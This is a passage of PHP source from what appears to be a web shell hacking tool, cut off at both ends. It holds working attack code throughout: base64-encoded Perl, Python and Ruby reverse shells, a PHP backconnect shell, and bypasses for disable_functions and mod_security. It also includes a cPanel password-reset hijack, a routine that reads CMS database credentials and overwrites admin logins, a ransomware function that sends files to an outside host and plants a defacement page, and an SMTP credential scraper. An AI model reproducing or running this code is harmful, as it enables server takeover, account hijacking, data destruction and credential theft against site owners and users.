        $brt = @fopen('bp.pl', 'w');
        fwrite($brt, $bp);
        $out = exe('perl bp.pl '.$_POST['port'].' 1>/dev/null 2>&1 &');
        sleep(1);
        echo "<pre class='mt-3' style='border-radius:20px; background:#fff; padding:15px; color:#333;'>$out\n".exe('ps aux | grep bp.pl').'</pre>';
        unlink('bp.pl');
    }
    if ($_POST['backconnect'] == 'perl') {
        $bc = base64_decode('IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7');
        $plbc = @fopen('bc.pl', 'w');
        fwrite($plbc, $bc);
        $out = exe('perl bc.pl '.$_POST['server'].' '.$_POST['port'].' 1>/dev/null 2>&1 &');
        sleep(1);
        echo "<pre class='mt-3' style='border-radius:20px; background:#fff; padding:15px; color:#333;'>$out\n".exe('ps aux | grep bc.pl').'</pre>';
        unlink('bc.pl');
    }
    if ($_POST['backconnect'] == 'python') {
        $becaa = base64_decode('IyEvdXNyL2Jpbi9weXRob24NCiNVc2FnZTogcHl0aG9uIGZpbGVuYW1lLnB5IEhPU1QgUE9SVA0KaW1wb3J0IHN5cywgc29ja2V0LCBvcywgc3VicHJvY2Vzcw0KaXBsbyA9IHN5cy5hcmd2WzFdDQpwb3J0bG8gPSBpbnQoc3lzLmFyZ3ZbMl0pDQpzb2NrZXQuc2V0ZGVmYXVsdHRpbWVvdXQoNjApDQpkZWYgcHliYWNrY29ubmVjdCgpOg0KICB0cnk6DQogICAgam1iID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pDQogICAgam1iLmNvbm5lY3QoKGlwbG8scG9ydGxvKSkNCiAgICBqbWIuc2VuZCgnJydcblB5dGhvbiBCYWNrQ29ubmVjdCBCeSBNci54QmFyYWt1ZGFcblRoYW5rcyBHb29nbGUgRm9yIFJlZmVyZW5zaVxuXG4nJycpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMCkNCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwxKQ0KICAgIG9zLmR1cDIoam1iLmZpbGVubygpLDIpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMykNCiAgICBzaGVsbCA9IHN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKQ0KICBleGNlcHQgc29ja2V0LnRpbWVvdXQ6DQogICAgcHJpbnQgIlRpbU91dCINCiAgZXhjZXB0IHNvY2tldC5lcnJvciwgZToNCiAgICBwcmludCAiRXJyb3IiLCBlDQpweWJhY2tjb25uZWN0KCk=');
        $pbcaa = @fopen('bcpyt.py', 'w');
        fwrite($pbcaa, $becaa);
        $out1 = exe('python bcpyt.py '.$_POST['server'].' '.$_POST['port']);
        sleep(1);
        echo "<pre class='mt-3' style='border-radius:20px; background:#fff; padding:15px; color:#333;'>$out1\n".exe('ps aux | grep bcpyt.py').'</pre>';
        unlink('bcpyt.py');
    }
    if ($_POST['backconnect'] == 'ruby') {
        $becaak = base64_decode('IyEvdXNyL2Jpbi9lbnYgcnVieQ0KIyBkZXZpbHpjMGRlLm9yZyAoYykgMjAxMg0KIw0KIyBiaW5kIGFuZCByZXZlcnNlIHNoZWxsDQojIGIzNzRrDQpyZXF1aXJlICdzb2NrZXQnDQpyZXF1aXJlICdwYXRobmFtZScNCg0KZGVmIHVzYWdlDQoJcHJpbnQgImJpbmQgOlxyXG4gIHJ1YnkgIiArIEZpbGUuYmFzZW5hbWUoX19GSUxFX18pICsgIiBbcG9ydF1cclxuIg0KCXByaW50ICJyZXZlcnNlIDpcclxuICBydWJ5ICIgKyBGaWxlLmJhc2VuYW1lKF9fRklMRV9fKSArICIgW3BvcnRdIFtob3N0XVxyXG4iDQplbmQNCg0KZGVmIHN1Y2tzDQoJc3Vja3MgPSBmYWxzZQ0KCWlmIFJVQllfUExBVEZPUk0uZG93bmNhc2UubWF0Y2goJ21zd2lufHdpbnxtaW5ndycpDQoJCXN1Y2tzID0gdHJ1ZQ0KCWVuZA0KCXJldHVybiBzdWNrcw0KZW5kDQoNCmRlZiByZWFscGF0aChzdHIpDQoJcmVhbCA9IHN0cg0KCWlmIEZpbGUuZXhpc3RzPyhzdHIpDQoJCWQgPSBQYXRobmFtZS5uZXcoc3RyKQ0KCQlyZWFsID0gZC5yZWFscGF0aC50b19zDQoJZW5kDQoJaWYgc3Vja3MNCgkJcmVhbCA9IHJlYWwuZ3N1YigvXC8vLCJcXCIpDQoJZW5kDQoJcmV0dXJuIHJlYWwNCmVuZA0KDQppZiBBUkdWLmxlbmd0aCA9PSAxDQoJaWYgQVJHVlswXSA9fiAvXlswLTldezEsNX0kLw0KCQlwb3J0ID0gSW50ZWdlcihBUkdWWzBdKQ0KCWVsc2UNCgkJdXNhZ2UNCgkJcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCgkJZXhpdA0KCWVuZA0KCXNlcnZlciA9IFRDUFNlcnZlci5uZXcoIiIsIHBvcnQpDQoJcyA9IHNlcnZlci5hY2NlcHQNCglwb3J0ID0gcy5wZWVyYWRkclsxXQ0KCW5hbWUgPSBzLnBlZXJhZGRyWzJdDQoJcy5wcmludCAiKioqIGNvbm5lY3RlZFxyXG4iDQoJcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fVxyXG4iDQoJYmVnaW4NCgkJaWYgbm90IHN1Y2tzDQoJCQlmID0gcy50b19pDQoJCQlleGVjIHNwcmludGYoIi9iaW4vc2ggLWkgXDxcJiVkIFw+XCYlZCAyXD5cJiVkIixmLGYsZikNCgkJZWxzZQ0KCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQl3aGlsZSBsaW5lID0gcy5nZXRzDQoJCQkJcmFpc2UgZXJyb3JCcm8gaWYgbGluZSA9fiAvXmRpZVxyPyQvDQoJCQkJaWYgbm90IGxpbmUuY2hvbXAgPT0gIiINCgkJCQkJaWYgbGluZSA9fiAvY2QgLiovaQ0KCQkJCQkJbGluZSA9IGxpbmUuZ3N1YigvY2QgL2ksICcnKS5jaG9tcA0KCQkJCQkJaWYgRmlsZS5kaXJlY3Rvcnk/KGxpbmUpDQoJCQkJCQkJbGluZSA9IHJlYWxwYXRoKGxpbmUpDQoJCQkJCQkJRGlyLmNoZGlyKGxpbmUpDQoJCQkJCQllbmQNCgkJCQkJCXMucHJpbnQgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+Ig0KCQkJCQllbHNpZiBsaW5lID1+IC9cdzouKi9pDQoJCQkJCQlpZiBGaWxlLmRpcmVjdG9yeT8obGluZS5jaG9tcCkNCgkJCQkJCQlEaXIuY2hkaXIobGluZS5jaG9tcCkNCgkJCQkJCWVuZA0KCQkJCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQkJCWVsc2UNCgkJCQkJCUlPLnBvcGVuKGxpbmUsInIiKXt8aW98cy5wcmludCBpby5yZWFkICsgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+In0NCgkJCQkJZW5kDQoJCQkJZW5kDQoJCQllbmQNCgkJZW5kDQoJcmVzY3VlIGVycm9yQnJvDQoJCXB1dHMgIioqKiAje25hbWV9OiN7cG9ydH0gZGlzY29ubmVjdGVkIg0KCWVuc3VyZQ0KCQlzLmNsb3NlDQoJCXMgPSBuaWwNCgllbmQNCmVsc2lmIEFSR1YubGVuZ3RoID09IDINCglpZiBBUkdWWzBdID1+IC9eWzAtOV17MSw1fSQvDQoJCXBvcnQgPSBJbnRlZ2VyKEFSR1ZbMF0pDQoJCWhvc3QgPSBBUkdWWzFdDQoJZWxzaWYgQVJHVlsxXSA9fiAvXlswLTldezEsNX0kLw0KCQlwb3J0ID0gSW50ZWdlcihBUkdWWzFdKQ0KCQlob3N0ID0gQVJHVlswXQ0KCWVsc2UNCgkJdXNhZ2UNCgkJcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCgkJZXhpdA0KCWVuZA0KCXMgPSBUQ1BTb2NrZXQubmV3KCIje2hvc3R9IiwgcG9ydCkNCglwb3J0ID0gcy5wZWVyYWRkclsxXQ0KCW5hbWUgPSBzLnBlZXJhZGRyWzJdDQoJcy5wcmludCAiKioqIGNvbm5lY3RlZFxyXG4iDQoJcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fSINCgliZWdpbg0KCQlpZiBub3Qgc3Vja3MNCgkJCWYgPSBzLnRvX2kNCgkJCWV4ZWMgc3ByaW50ZigiL2Jpbi9zaCAtaSBcPFwmJWQgXD5cJiVkIDJcPlwmJWQiLCBmLCBmLCBmKQ0KCQllbHNlDQoJCQlzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCgkJCXdoaWxlIGxpbmUgPSBzLmdldHMNCgkJCQlyYWlzZSBlcnJvckJybyBpZiBsaW5lID1+IC9eZGllXHI/JC8NCgkJCQlpZiBub3QgbGluZS5jaG9tcCA9PSAiIg0KCQkJCQlpZiBsaW5lID1+IC9jZCAuKi9pDQoJCQkJCQlsaW5lID0gbGluZS5nc3ViKC9jZCAvaSwgJycpLmNob21wDQoJCQkJCQlpZiBGaWxlLmRpcmVjdG9yeT8obGluZSkNCgkJCQkJCQlsaW5lID0gcmVhbHBhdGgobGluZSkNCgkJCQkJCQlEaXIuY2hkaXIobGluZSkNCgkJCQkJCWVuZA0KCQkJCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQkJCWVsc2lmIGxpbmUgPX4gL1x3Oi4qL2kNCgkJCQkJCWlmIEZpbGUuZGlyZWN0b3J5PyhsaW5lLmNob21wKQ0KCQkJCQkJCURpci5jaGRpcihsaW5lLmNob21wKQ0KCQkJCQkJZW5kDQoJCQkJCQlzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCgkJCQkJZWxzZQ0KCQkJCQkJSU8ucG9wZW4obGluZSwiciIpe3xpb3xzLnByaW50IGlvLnJlYWQgKyAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4ifQ0KCQkJCQllbmQNCgkJCQllbmQNCgkJCWVuZA0KCQllbmQNCglyZXNjdWUgZXJyb3JCcm8NCgkJcHV0cyAiKioqICN7bmFtZX06I3twb3J0fSBkaXNjb25uZWN0ZWQiDQoJZW5zdXJlDQoJCXMuY2xvc2UNCgkJcyA9IG5pbA0KCWVuZA0KZWxzZQ0KCXVzYWdlDQoJZXhpdA0KZW5k');
        $pbcaak = @fopen('bcruby.rb', 'w');
        fwrite($pbcaak, $becaak);
        $out2 = exe('ruby bcruby.rb '.$_POST['server'].' '.$_POST['port']);
        sleep(1);
        echo "<pre class='mt-3' style='border-radius:20px; background:#fff; padding:15px; color:#333;'>$out2\n".exe('ps aux | grep bcruby.rb').'</pre>';
        unlink('bcruby.rb');
    }
    if ($_POST['backconnect'] == 'php') {
        $ip = $_POST['server'];
        $port = $_POST['port'];
        $sockfd = fsockopen($ip, $port, $errno, $errstr);
        if ($errno != 0) {
            echo "<div class='alert alert-danger mt-3'>$errno : $errstr</div>";
        } elseif (!$sockfd) {
            $result = '<p class="alert alert-warning mt-3">Unexpected error has occured, connection may have failed.</p>';
        } else {
            fwrite($sockfd, "
            \n{#######################################}
            \n..:: BackConnect PHP ::..
            \n{#######################################}\n");
            $dir = @shell_exec('pwd');
            $sysinfo = @shell_exec('uname -a');
            $time = @shell_exec('time');
            $len = 1337;
            fwrite($sockfd, 'User ', $sysinfo, 'connected @ ', $time, "\n\n");
            while (!feof($sockfd)) {
                $cmdPrompt = '[kuda]#:> ';
                @fwrite($sockfd, $cmdPrompt);
                $command = fgets($sockfd, $len);
                @fwrite($sockfd, "\n".@shell_exec($command)."\n\n");
            }
            @fclose($sockfd);
        }
    }
    echo "</div></div>";
    exit;
}
function disabFunc($dir, $file) {
    echo "<div class='card shadow-lg border-0' style='border-radius:20px;'>
        <div class='card-body text-center'>
            <h5 style='color:#ec407a;'><i class='fas fa-unlock'></i> Bypass Disable Functions</h5>
            <div class='btn-group d-flex mt-3' role='group'>
                <form method='POST' class='w-100'>
                    <button type='submit' name='ini' class='btn btn-outline-pink w-100 mb-2'><i class='fas fa-file-code'></i> php.ini</button>
                    <button type='submit' name='htce' class='btn btn-outline-pink w-100 mb-2'><i class='fas fa-file-alt'></i> .htaccess</button>
                    <button type='submit' name='litini' class='btn btn-outline-pink w-100'><i class='fas fa-tachometer-alt'></i> Litespeed</button>
                </form>
            </div>";
    if (isset($_POST['ini'])) {
        $file = fopen('php.ini', 'w');
        echo fwrite($file, "safe_mode = OFF\ndisable_functions = NONE");
        fclose($file);
        echo "<a href='php.ini' class='btn btn-pink btn-block mt-3' target='_blank' style='border-radius:50px;'><i class='fas fa-download'></i> Download php.ini</a>";
    } elseif (isset($_POST['htce'])) {
        $file = fopen('.htaccess', 'w');
        echo fwrite($file, "<IfModule mod_security.c>\nSecFilterEngine Off\nSecFilterScanPOST Off\n</IfModule>");
        fclose($file);
        echo '<div class="alert alert-success mt-3">.htaccess created successfully!</div>';
    } elseif (isset($_POST['litini'])) {
        $iniph = 'PD8gZWNobyBpbmlfZ2V0KCJzYWZlX21vZGUiKTsNCmVjaG8gaW5pX2dldCgib3Blbl9iYXNlZGlyIik7DQplY2hvIGluY2x1ZGUoJF9HRVRbImZpbGUiXSk7DQplY2hvIGluaV9yZXN0b3JlKCJzYWZlX21vZGUiKTsNCmVjaG8gaW5pX3Jlc3RvcmUoIm9wZW5fYmFzZWRpciIpOw0KZWNobyBpbmlfZ2V0KCJzYWZlX21vZGUiKTsNCmVjaG8gaW5pX2dldCgib3Blbl9iYXNlZGlyIik7DQplY2hvIGluY2x1ZGUoJF9HRVRbInNzIl0pOw0KPz4=';
        $byph = "safe_mode = OFF\ndisable_functions = NONE";
        $comp = "<Files *.php>\nForceType application/x-httpd-php4\n</Files>";
        file_put_contents('php.ini', $byph);
        file_put_contents('ini.php', $iniph);
        file_put_contents('.htaccess', $comp);
        $swa = 'success';
        $text = 'Disable Functions bypass created for Litespeed';
        swall($swa, $text, $dir);
    }
    echo '</div></div>';
}
function resetCp($dir) {
    echo "<div class='card shadow-lg border-0' style='border-radius:20px;'>
        <div class='card-body text-center'>
            <h5 style='color:#ec407a;'><i class='fas fa-key'></i> Auto Reset Cpanel Password</h5>
            <form method='POST' class='mt-4'>
                <div class='form-group input-group'>
                    <div class='input-group-prepend'>
                        <span class='input-group-text' style='border-radius:50px 0 0 50px; background:#fce4ec;'><i class='fas fa-envelope' style='color:#ec407a;'></i></span>
                    </div>
                    <input type='email' name='email' class='form-control' placeholder='Enter email...' style='border-radius:0 50px 50px 0;'/>
                </div>
                <button type='submit' name='submit' class='btn btn-pink btn-block' style='border-radius:50px;'><i class='fas fa-paper-plane'></i> Send Reset</button>
            </form>
        </div>
    </div>";
    if (isset($_POST['submit'])) {
        $user = get_current_user();
        $site = $_SERVER['HTTP_HOST'];
        $ips = getenv('REMOTE_ADDR');
        $email = $_POST['email'];
        $wr = 'email:'.$email;
        $f = fopen('/home/'.$user.'/.cpanel/contactinfo', 'w');
        @fwrite($f, $wr);
        @fclose($f);
        $f = fopen('/home/'.$user.'/.contactinfo', 'w');
        @fwrite($f, $wr);
        @fclose($f);
        $parm = $site.':2082/resetpass?start=1';
        echo '<div class="alert alert-success mt-4">
            <strong>Reset URL:</strong> '.$parm.'<br>
            <strong>Username:</strong> '.$user.'<br>
            <strong>Reset sent to:</strong> '.$email.'
        </div>';
    }
    exit;
}
function autoEdit($dir, $file) {
    if ($_POST['hajar']) {
        if (strlen($_POST['pass_baru']) < 6 or strlen($_POST['user_baru']) < 6) {
            echo '<div class="alert alert-warning">Username and password must be at least 6 characters</div>';
        } else {
            $user_baru = $_POST['user_baru'];
            $pass_baru = md5($_POST['pass_baru']);
            $conf = $_POST['config_dir'];
            $scan_conf = scandir($conf);
            foreach ($scan_conf as $file_conf) {
                if (!is_file("$conf/$file_conf")) {
                    continue;
                }
                $config = file_get_contents("$conf/$file_conf");
                if (preg_match('/JConfig|joomla/', $config)) {
                    $dbhost = ambilkata($config, "host = '", "'");
                    $dbuser = ambilkata($config, "user = '", "'");
                    $dbpass = ambilkata($config, "password = '", "'");
                    $dbname = ambilkata($config, "db = '", "'");
                    $dbprefix = ambilkata($config, "dbprefix = '", "'");
                    $prefix = $dbprefix.'users';
                    $conn = mysqli_connect($dbhost, $dbuser, $dbpass);
                    $db = mysqli_select_db($conn, $dbname);
                    $q = mysqli_query($conn, "SELECT * FROM $prefix ORDER BY id ASC");
                    $result = mysqli_fetch_array($q);
                    $id = $result['id'];
                    $site = ambilkata($config, "sitename = '", "'");
                    $update = mysqli_query($conn, "UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
                    echo '<div class="alert alert-info">Config: '.$file_conf.'<br>CMS: Joomla<br>';
                    if ($site == '') {
                        echo 'Sitename: <span class="text-danger">Cannot get domain</span><br>';
                    } else {
                        echo "Sitename: $site<br>";
                    }
                    if (!$update or !$conn or !$db) {
                        echo 'Status: <span class="text-danger">'.mysqli_error($conn).'</span></div>';
                    } else {
                        echo 'Status: <span class="text-success">Success! Login with new credentials.</span></div>';
                    }
                    mysqli_close($conn);
                } elseif (preg_match('/WordPress/', $config)) {
                    $dbhost = ambilkata($config, "DB_HOST', '", "'");
                    $dbuser = ambilkata($config, "DB_USER', '", "'");
                    $dbpass = ambilkata($config, "DB_PASSWORD', '", "'");
                    $dbname = ambilkata($config, "DB_NAME', '", "'");
                    $dbprefix = ambilkata($config, "table_prefix  = '", "'");
                    $prefix = $dbprefix.'users';
                    $option = $dbprefix.'options';
                    $conn = mysqli_connect($dbhost, $dbuser, $dbpass);
                    $db = mysqli_select_db($conn, $dbname);
                    $q = mysqli_query($conn, "SELECT * FROM $prefix ORDER BY id ASC");
                    $result = mysqli_fetch_array($q);
                    $id = $result['id'];
                    $q2 = mysqli_query($conn, "SELECT * FROM $option ORDER BY option_id ASC");
                    $result2 = mysqli_fetch_array($q2);
                    $target = $result2['option_value'];
                    if ($target == '') {
                        $url_target = 'Login: <span class="text-danger">Cannot get domain</span><br>';
                    } else {
                        $url_target = "Login: <a href='$target/wp-login.php' target='_blank' class='text-pink'>$target/wp-login.php</a><br>";
                    }
                    $update = mysqli_query($conn, "UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
                    echo '<div class="alert alert-info">Config: '.$file_conf.'<br>CMS: WordPress<br>';
                    echo $url_target;
                    if (!$update or !$conn or !$db) {
                        echo 'Status: <span class="text-danger">'.mysqli_error($conn).'</span></div>';
                    } else {
                        echo 'Status: <span class="text-success">Success! Login with new credentials.</span></div>';
                    }
                    mysqli_close($conn);
                } elseif (preg_match('/Magento|Mage_Core/', $config)) {
                    $dbhost = ambilkata($config, '<host><![CDATA[', ']]></host>');
                    $dbuser = ambilkata($config, '<username><![CDATA[', ']]></username>');
                    $dbpass = ambilkata($config, '<password><![CDATA[', ']]></password>');
                    $dbname = ambilkata($config, '<dbname><![CDATA[', ']]></dbname>');
                    $dbprefix = ambilkata($config, '<table_prefix><![CDATA[', ']]></table_prefix>');
                    $prefix = $dbprefix.'admin_user';
                    $option = $dbprefix.'core_config_data';
                    $conn = mysqli_connect($dbhost, $dbuser, $dbpass);
                    $db = mysqli_select_db($conn, $dbname);
                    $q = mysqli_query($conn, "SELECT * FROM $prefix ORDER BY user_id ASC");
                    $result = mysqli_fetch_array($q);
                    $id = $result['user_id'];
                    $q2 = mysqli_query($conn, "SELECT * FROM $option WHERE path='web/secure/base_url'");
                    $result2 = mysqli_fetch_array($q2);
                    $target = $result2['value'];
                    if ($target == '') {
                        $url_target = 'Login: <span class="text-danger">Cannot get domain</span><br>';
                    } else {
                        $url_target = "Login: <a href='$target/admin/' target='_blank' class='text-pink'>$target/admin/</a><br>";
                    }
                    $update = mysqli_query($conn, "UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
                    echo '<div class="alert alert-info">Config: '.$file_conf.'<br>CMS: Magento<br>';
                    echo $url_target;
                    if (!$update or !$conn or !$db) {
                        echo 'Status: <span class="text-danger">'.mysqli_error($conn).'</span></div>';
                    } else {
                        echo 'Status: <span class="text-success">Success! Login with new credentials.</span></div>';
                    }
                    mysqli_close($conn);
                } elseif (preg_match('/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/', $config)) {
                    $dbhost = ambilkata($config, "'DB_HOSTNAME', '", "'");
                    $dbuser = ambilkata($config, "'DB_USERNAME', '", "'");
                    $dbpass = ambilkata($config, "'DB_PASSWORD', '", "'");
                    $dbname = ambilkata($config, "'DB_DATABASE', '", "'");
                    $dbprefix = ambilkata($config, "'DB_PREFIX', '", "'");
                    $prefix = $dbprefix.'user';
                    $conn = mysqli_connect($dbhost, $dbuser, $dbpass);
                    $db = mysqli_select_db($conn, $dbname);
                    $q = mysqli_query($conn, "SELECT * FROM $prefix ORDER BY user_id ASC");
                    $result = mysqli_fetch_array($q);
                    $id = $result['user_id'];
                    $target = ambilkata($config, "HTTP_SERVER', '", "'");
                    if ($target == '') {
                        $url_target = 'Login: <span class="text-danger">Cannot get domain</span><br>';
                    } else {
                        $url_target = "Login: <a href='$target' target='_blank' class='text-pink'>$target</a><br>";
                    }
                    $update = mysqli_query($conn, "UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
                    echo '<div class="alert alert-info">Config: '.$file_conf.'<br>CMS: OpenCart<br>';
                    echo $url_target;
                    if (!$update or !$conn or !$db) {
                        echo 'Status: <span class="text-danger">'.mysqli_error($conn).'</span></div>';
                    } else {
                        echo 'Status: <span class="text-success">Success! Login with new credentials.</span></div>';
                    }
                    mysqli_close($conn);
                } elseif (preg_match('/panggil fungsi validasi xss dan injection/', $config)) {
                    $dbhost = ambilkata($config, 'server = "', '"');
                    $dbuser = ambilkata($config, 'username = "', '"');
                    $dbpass = ambilkata($config, 'password = "', '"');
                    $dbname = ambilkata($config, 'database = "', '"');
                    $prefix = 'users';
                    $option = 'identitas';
                    $conn = mysqli_connect($dbhost, $dbuser, $dbpass);
                    $db = mysqli_select_db($conn, $dbname);
                    $q = mysqli_query($conn, "SELECT * FROM $option ORDER BY id_identitas ASC");
                    $result = mysqli_fetch_array($q);
                    $target = $result['alamat_website'];
                    if ($target == '') {
                        $target2 = $result['url'];
                        $url_target = 'Login: <span class="text-danger">Cannot get domain</span><br>';
                        if ($target2 == '') {
                            $url_target2 = 'Login: <span class="text-danger">Cannot get domain</span><br>';
                        } else {
                            $cek_login3 = file_get_contents("$target2/adminweb/");
                            $cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
                            if (preg_match('/CMS Lokomedia|Administrator/', $cek_login3)) {
                                $url_target2 = "Login: <a href='$target2/adminweb' target='_blank' class='text-pink'>$target2/adminweb</a><br>";
                            } elseif (preg_match('/CMS Lokomedia|Lokomedia/', $cek_login4)) {
                                $url_target2 = "Login: <a href='$target2/lokomedia/adminweb' target='_blank' class='text-pink'>$target2/lokomedia/adminweb</a><br>";
                            } else {
                                $url_target2 = "Login: <a href='$target2' target='_blank' class='text-pink'>$target2</a> [Admin login location unknown]<br>";
                            }
                        }
                    } else {
                        $cek_login = file_get_contents("$target/adminweb/");
                        $cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
                        if (preg_match('/CMS Lokomedia|Administrator/', $cek_login)) {
                            $url_target = "Login: <a href='$target/adminweb' target='_blank' class='text-pink'>$target/adminweb</a><br>";
                        } elseif (preg_match('/CMS Lokomedia|Lokomedia/', $cek_login2)) {
                            $url_target = "Login: <a href='$target/lokomedia/adminweb' target='_blank' class='text-pink'>$target/lokomedia/adminweb</a><br>";
                        } else {
                            $url_target = "Login: <a href='$target' target='_blank' class='text-pink'>$target</a> [Admin login location unknown]<br>";
                        }
                    }
                    $update = mysqli_query($conn, "UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
                    echo '<div class="alert alert-info">Config: '.$file_conf.'<br>CMS: Lokomedia<br>';
                    if (preg_match('/Cannot get domain/', $url_target)) {
                        echo $url_target2;
                    } else {
                        echo $url_target;
                    }
                    if (!$update or !$conn or !$db) {
                        echo 'Status: <span class="text-danger">'.mysqli_error($conn).'</span></div>';
                    } else {
                        echo 'Status: <span class="text-success">Success! Login with new credentials.</span></div>';
                    }
                    mysqli_close($conn);
                }
            }
        }
    } else {
        echo "<div class='card shadow-lg border-0' style='border-radius:20px;'>
            <div class='card-body'>
                <h5 style='color:#ec407a;'><i class='fas fa-user-edit'></i> Auto Edit User</h5>
                <form method='post'>
                    <div class='form-group'>
                        <label>Config Directory:</label>
                        <input type='text' class='form-control' name='config_dir' value='$dir' style='border-radius:50px;'>
                    </div>
                    <div class='form-group'>
                        <label>New Username:</label>
                        <input type='text' name='user_baru' value='pororo' class='form-control' style='border-radius:50px;'>
                    </div>
                    <div class='form-group'>
                        <label>New Password:</label>
                        <input type='text' name='pass_baru' value='pororo123' class='form-control' style='border-radius:50px;'>
                    </div>
                    <button type='submit' name='hajar' class='btn btn-pink btn-block' style='border-radius:50px;'><i class='fas fa-save'></i> Update User</button>
                </form>
                <small class='text-muted d-block mt-3'>Note: This tool works best when run inside a config folder.</small>
            </div>
        </div>";
    }
    exit;
}
function ransom($dir, $file) {
    if (isset($_POST['encrypt'])) {
        $dir = $_POST['target'];
        echo"<textarea class='form-control mb-4' rows='13' style='border-radius:20px; font-family:monospace;' readonly>";
        function listFolderFiles($dir) {
            if (is_dir($dir)) {
                $ffs = scandir($dir);
                unset($ffs[array_search('.', $ffs, true)]);
                unset($ffs[array_search('..', $ffs, true)]);
                if (count($ffs) < 1) {
                    return;
                }
                foreach ($ffs as $ff) {
                    $files = $dir.'/'.$ff;
                    if (!is_dir($files)) {
                        /* encrypt file */
                        $file = file_get_contents($files);
                        $_a = base64_encode($file);
                        /* proses curl */
                        $ch = curl_init();
                        curl_setopt($ch, CURLOPT_URL, 'http://encrypt.indsc.me/api.php?type=encrypt');
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($ch, CURLOPT_POSTFIELDS, "text=$_a");
                        $x = json_decode(curl_exec($ch));
                        if ($x->status == 'success') {
                            $_enc = base64_decode($x->data);
                            rename($files, $files.'.indsc');
                            echo "[+]$files => Success Encrypted\n";
                        }
                    }
                    if (is_dir($dir.'/'.$ff)) {
                        listFolderFiles($dir.'/'.$ff);
                    }
                }
                $index = file_get_contents('https://pastebin.com/raw/aGZ6BeTH');
                $_o = fopen($dir.'/index.html', 'w');
                fwrite($_o, $index);
                fclose($_o);
                echo "\n[+] Done !";
            } else {
                echo "\nNot a directory";
            }
        }
        listFolderFiles($dir);
        echo '</textarea>';
    } else {
        echo "<div class='card shadow-lg border-0' style='border-radius:20px;'>
            <div class='card-body'>
                <h5 style='color:#ec407a;' class='text-center'><i class='fas fa-lock'></i> Ransomware Tool</h5>
                <form method='post'>
                    <div class='form-group'>
                        <label><i class='fas fa-folder'></i> Target Directory:</label>
                        <div class='input-group'>
                            <div class='input-group-prepend'>
                                <span class='input-group-text' style='border-radius:50px 0 0 50px; background:#fce4ec;'><i class='fas fa-home' style='color:#ec407a;'></i></span>
                            </div>
                            <input type='text' name='target' class='form-control' value='".$dir."' style='border-radius:0 50px 50px 0;'/>
                        </div>
                    </div>
                    <button type='submit' name='encrypt' class='btn btn-pink btn-block' style='border-radius:50px;'><i class='fas fa-skull'></i> Encrypt</button>
                </form>
            </div>
        </div>";
    }
    exit;
}
function scj($dir) {
    $dirs = scandir($dir);
    echo "<div class='card shadow-lg border-0' style='border-radius:20px;'>
        <div class='card-body'>";
    foreach ($dirs as $dirb) {
        if (!is_file("$dir/$dirb")) {
            continue;
        }
        $ambil = file_get_contents("$dir/$dirb");
        $ambil = str_replace('$', '', $ambil);
        if (preg_match('/JConfig|joomla/', $ambil)) {
            $smtp_host = ambilkata($ambil, "smtphost = '", "'");
            $smtp_auth = ambilkata($ambil, "smtpauth = '", "'");
            $smtp_user = ambilkata($ambil, "smtpuser = '", "'");
            $smtp_pass = ambilkata($ambil, "smtppass = '", "'");
            $smtp_port = ambilkata($ambil, "smtpport = '", "'");
            $smtp_secure = ambilkata($ambil, "smtpsecure = '", "'");
            echo "<div class='mb-3 p-3' style='background:#fce4ec; border-radius:20px;'>
                <strong>SMTP Configuration Found:</strong><br>
                Host: $smtp_host<br>
                Port: $smtp_port<br>
                User: $smtp_user<br>
                Pass: $smtp_pass<br>
